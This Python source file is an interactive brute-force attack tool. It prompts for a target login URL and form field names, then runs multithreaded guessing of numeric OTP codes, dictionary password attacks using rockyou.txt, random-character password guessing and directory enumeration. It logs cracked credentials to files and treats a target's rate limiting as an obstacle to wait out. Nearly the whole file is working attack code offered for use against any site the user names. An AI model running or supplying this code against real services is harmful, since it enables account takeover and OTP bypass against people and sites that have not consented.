#!/usr/bin/python3

# modules
import time
import pyfiglet
import requests
import os
import requests
import random
from threading import Thread
from termcolor import colored
from os import system
from os.path import exists
"""
# Heading
system('clear')
name = "T R Y  T H I S"
print("."*100)
print(colored(pyfiglet.figlet_format(name, 'arrows'), 'green'))
print("."*100)
"""


def otp():
    try:
        system('clear')
        name = "T R Y  \nT H I S"
        print("." * 100)
        print(colored(pyfiglet.figlet_format(name, 'arrows'), 'red'))
        print("." * 100)
        print('\n')
        print(
            "HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.\n")
        a = int(input("Enter here (1/2): "))
        if a == 1:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'red'))
            print("." * 100)
            print('\n')
            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
            otps = input("Enter where is password stored: ")
            bca = input("response when failed: ")
            n = int(input("Enter password length(4): "))
            tn = int(input("Enter thread count(20): "))

            def send_request(password):
                data = {
                    otps: password,
                }

                r = requests.get(url, data=data)
                return r

            chars = "0123456789"

            def main():
                while True:
                    if "correct_pass.txt" in os.listdir():
                        break
                    valid = False
                    while not valid:
                        rndpasswd = random.choices(chars, k=n)
                        passwd = "".join(rndpasswd)
                        file = open("tries.txt", 'r')
                        tries = file.read()
                        file.close()
                        if passwd in tries:
                            pass
                        else:
                            valid = True

                        r = send_request(passwd)

                        if str(bca) in r.text.lower():
                            with open("tries.txt", "a") as f:
                                f.write(f"{passwd}\n")
                                f.close()
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct otp is {passwd}!\n")
                            with open("correct_pass.txt", "w") as f:
                                f.write(passwd)
                            with open('saves/otp.txt', 'a') as m:
                                m.write("newscan\n")
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.write('\n')
                                m.write(url)
                                m.write('\n')
                                m.write(f'{passwd}')
                                m.write('\n')
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.close()
                            break
                        break

            for x in range(tn):
                Thread(target=main).start()
        elif a == 2:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'red'))
            print("." * 100)
            print('\n')
            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
            otps = input("Enter where is password stored: ")
            bca = input("response when failed: ")
            n = int(input("Enter password length(4): "))
            tn = int(input("Enter thread count(20): "))

            def send_request(password):
                data = {
                    otps: password,
                }

                r = requests.get(url, data=data)
                return r

            chars = "0123456789"

            def main():
                while True:
                    if "correct_pass.txt" in os.listdir():
                        break
                    valid = False
                    while not valid:
                        rndpasswd = random.choices(chars, k=n)
                        passwd = "".join(rndpasswd)
                        file = open("tries.txt", 'r')
                        tries = file.read()
                        file.close()
                        if passwd in tries:
                            pass
                        else:
                            valid = True

                        r = send_request(passwd)

                        if r.status_code == 200:
                            with open("tries.txt", "a") as f:
                                f.write(f"{passwd}\n")
                                f.close()
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct otp is {passwd}!\n")
                            with open("correct_pass.txt", "w") as f:
                                f.write(passwd)
                            break
                        break

            for x in range(tn):
                Thread(target=main).start()

        else:
            print(colored("Enter correct option. Try again", 'red'))
            time.sleep(1)
            passw()

    except KeyboardInterrupt:
        ex = input("\n\nDo you want to exit (y/n): ")
        if ex == 'y' or ex == 'Y':
            system('./main.py')
        else:
            otp()
    except ConnectionError:
        print("Network Connection is not good. Check Internet and try again.")
def directory():
    try:
        # Head
        system('clear')
        name = "T R Y  \nT H I S"
        print("." * 100)
        print(colored(pyfiglet.figlet_format(name, 'arrows'), 'green'))
        print("." * 100)


# entry
        words = input("\n\nEnter wordlist location ('/dir1/dir2/file.txt'): ")
        ex = exists(words)
        if not ex:
            print(colored("\n\nWordlist not exists", 'red'))
            print(colored("\nTry again", 'green'))
            time.sleep(2)
            directory()
        else:
            url = input("Enter url to directory brute force: ")
            with open(words, 'r') as file:
                for word in file:
                    abc = url + word
                    req = requests.get(abc)
                    if req.status_code == 404:
                        pass
                    elif req.status_code == 429:
                        print("\n\nWe can't do directory brute force due to rate limiting security messieurs is taken.")
                        print("\nYou can try stealth mode but take very long time")
                        time.sleep(2)
                        a = input("\nDo you want to scan stealth mode (y/n):")
                        if a == 'y' or a == 'y':
                            time.sleep(10)
                        else:
                            print('Hope you made a Good decision :)')
                            b = input('\n\nDo you want to try this attack again (y/n): ')
                            if b == 'y' or b == 'Y':
                                directory()
                    else:
                        print('\n')
                        print(abc, '- status code: ', end='')
                        print(req.status_code)
                        with open('saves/directory_brute_force.txt', 'a') as m:
                            m.write(abc)
        b = input('\n\n Do you want to try this attack again (y/n): ')
        if b == 'y' or b == 'Y':
            directory()
        else:
            system('./main.py')
    except KeyboardInterrupt:
        ex = input("\n\nDo you want to exit (y/n): ")
        if ex == 'y' or ex == 'Y':
            system('./main.py')
        else:
            directory()
    except ConnectionError:
        print("Network Connection is not good. Check Internet and try again.")


def passw():
    try:
        system('clear')
        name = "T R Y  \nT H I S"
        print("." * 100)
        print(colored(pyfiglet.figlet_format(name, 'arrows'), 'cyan'))
        print("." * 100)
        print('\n')
        print(
            "HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.\n")
        a = int(input("Enter here (1/2): "))
        if a == 1:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'cyan'))
            print("." * 100)
            print('\n')
            wl = input("Enter path of wordlist(/usr/share/rockyou.txt): ")
            if exists(wl):
                url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
                username = input("Enter username (admin): ")
                us = input("Enter where is username stored (uname) : ")
                ps = input("Enter where is password stored (passwd) : ")
                bca = input("Response when failed (failed to login) : ")
                print('\n')

                def main():
                    if "correct_pass.txt" in os.listdir():
                        print("Password saved into correct_pass.txt")
                    else:
                        with open(wl, 'r') as file:
                            for passwd in file:
                                data = {
                                    us: username,
                                    ps: passwd[0:len(passwd) - 1]
                                }
                                r = requests.get(url, data=data)
                                if str(bca) in r.text.lower():
                                    with open("tries.txt", "a") as f:
                                        f.write(f"{passwd}\n")
                                        f.close()
                                    print(f"Incorrect {passwd}")
                                    continue
                                else:
                                    print(f"Correct Password {passwd}\n")
                                    with open("correct_pass.txt", "w") as f:
                                        f.write(passwd)
                                    with open('saves/passwd.txt', 'a') as m:
                                        m.write("newscan\n")
                                        for i in range(100):
                                            m.write('*')
                                        m.write('\n')
                                        m.write('\n')
                                        m.write(url)
                                        m.write('\n')
                                        m.write(f'{username}:{passwd}')
                                        m.write('\n')
                                        for i in range(100):
                                            m.write('*')
                                        m.write('\n')
                                        m.close()
                                    break
                                break

                main()


            else:
                print(colored("Wordlist not exist. Try again", 'red'))
                time.sleep(1)
                passw()
        elif a == 2:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'cyan'))
            print("." * 100)
            print('\n')
            wl = input("Enter path of wordlist(/usr/share/rockyou.txt): ")
            if exists(wl):
                url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
                username = input("Enter username (admin): ")
                us = input("Enter where is username stored (uname) : ")
                ps = input("Enter where is password stored (passwd) : ")
                bca = input("Response when failed (failed to login) : ")
                print('\n')

                def main():
                    if "correct_pass.txt" in os.listdir():
                        print("Password saved into correct_pass.txt")
                    else:
                        with open(wl, 'r') as file:
                            for passwd in file:
                                data = {
                                    us: username,
                                    ps: passwd[0:len(passwd) - 1]
                                }
                                r = requests.get(url, data=data)
                                if r.status_code != 200:
                                    with open("tries.txt", "a") as f:
                                        f.write(f"{passwd}\n")
                                        f.close()
                                    print(f"Incorrect {passwd}")
                                    continue
                                else:
                                    print(f"Correct Password {passwd}\n")
                                    with open("correct_pass.txt", "w") as f:
                                        f.write(passwd)
                                    with open('saves/passwd.txt', 'a') as m:
                                        m.write("newscan\n")
                                        for i in range(100):
                                            m.write('*')
                                        m.write('\n')
                                        m.write('\n')
                                        m.write(url)
                                        m.write('\n')
                                        m.write(f'{username}:{passwd}')
                                        m.write('\n')
                                        for i in range(100):
                                            m.write('*')
                                        m.write('\n')
                                        m.close()
                                    break
                                break

                main()


            else:
                print(colored("Wordlist not exist. Try again", 'red'))
                time.sleep(1)
                passw()

        else:
            print(colored("Enter correct option. Try again", 'red'))
            time.sleep(1)
            passw()

    except KeyboardInterrupt:
        ex = input("\n\nDo you want to exit (y/n): ")
        if ex == 'y' or ex == 'Y':
            system('./main.py')
        else:
            passw()
    except ConnectionError:
        print("Network Connection is not good. Check Internet and try again.")
def passnoword():
    try:
        system('clear')
        name = "T R Y  \nT H I S"
        print("." * 100)
        print(colored(pyfiglet.figlet_format(name, 'arrows'), 'yellow'))
        print("." * 100)
        print('\n')
        print(
            "HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.\n")
        a = int(input("Enter here (1/2): "))
        if a == 1:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'yellow'))
            print("." * 100)
            print('\n')
            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
            username = input("Enter username (admin): ")
            us = input("Enter where is username stored: ")
            ps = input("Enter where is password stored: ")
            bca = input("response when failed: ")
            n = int(input("Enter password length(8): "))
            tn = int(input("Enter thread count(20): "))

            def send_request(username, password):
                data = {
                    us: username,
                    ps: password
                }
                print(data)
                r = requests.get(url, data=data)
                return r

            chars = "abcdefghijklmnopqrstuvwxyz0123456789"

            def main():
                while True:
                    if "correct_pass.txt" in os.listdir():
                        break
                    valid = False
                    while not valid:
                        rndpasswd = random.choices(chars, k=n)
                        passwd = "".join(rndpasswd)
                        file = open("tries.txt", 'r')
                        tries = file.read()
                        file.close()
                        if passwd in tries:
                            pass
                        else:
                            valid = True

                        r = send_request(username, passwd)

                        if str(bca) in r.text.lower():
                            with open("tries.txt", "a") as f:
                                f.write(f"{passwd}\n")
                                f.close()
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password {passwd}!\n")
                            with open("correct_pass.txt", "w") as f:
                                f.write(passwd)
                            with open('saves/passwd.txt', 'a') as m:
                                m.write("newscan\n")
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.write('\n')
                                m.write(url)
                                m.write('\n')
                                m.write(f'{username}:{passwd}')
                                m.write('\n')
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.close()
                            break
                        break

            for x in range(tn):
                Thread(target=main).start()
        elif a == 2:
            system('clear')
            name = "T R Y  \nT H I S"
            print("." * 100)
            print(colored(pyfiglet.figlet_format(name, 'arrows'), 'yellow'))
            print("." * 100)
            print('\n')
            url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
            username = input("Enter username (admin): ")
            us = input("Enter where is username stored: ")
            ps = input("Enter where is password stored: ")
            bca = input("response when failed: ")
            n = int(input("Enter password length(8): "))
            tn = int(input("Enter thread count(20): "))

            def send_request(username, password):
                data = {
                    us: username,
                    ps: password
                }

                r = requests.get(url, data=data)
                return r

            chars = "abcdefghijklmnopqrstuvwxyz0123456789"

            def main():
                while True:
                    if "correct_pass.txt" in os.listdir():
                        break
                    valid = False
                    while not valid:
                        rndpasswd = random.choices(chars, k=n)
                        passwd = "".join(rndpasswd)
                        file = open("tries.txt", 'r')
                        tries = file.read()
                        file.close()
                        if passwd in tries:
                            pass
                        else:
                            valid = True

                        r = send_request(username, passwd)

                        if r.status_code != 200:
                            with open("tries.txt", "a") as f:
                                f.write(f"{passwd}\n")
                                f.close()
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password {passwd}!\n")
                            with open("correct_pass.txt", "w") as f:
                                f.write(passwd)
                                f.close()
                            with open('saves/passwd.txt', 'a') as m:
                                m.write("newscan\n")
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.write('\n')
                                m.write(url)
                                m.write('\n')
                                m.write(f'{username}:{passwd}')
                                m.write('\n')
                                for i in range(100):
                                    m.write('*')
                                m.write('\n')
                                m.close()
                            break
                        break

            for x in range(tn):
                Thread(target=main).start()

        else:
            print(colored("Enter correct option. Try again", 'red'))
            time.sleep(1)
            passw()
    except KeyboardInterrupt:
        ex = input("\n\nDo you want to exit (y/n): ")
        if ex == 'y' or ex == 'Y':
            system('./main.py')
        else:
            passnoword()
    except ConnectionError:
        print("Network Connection is not good. Check Internet and try again.")
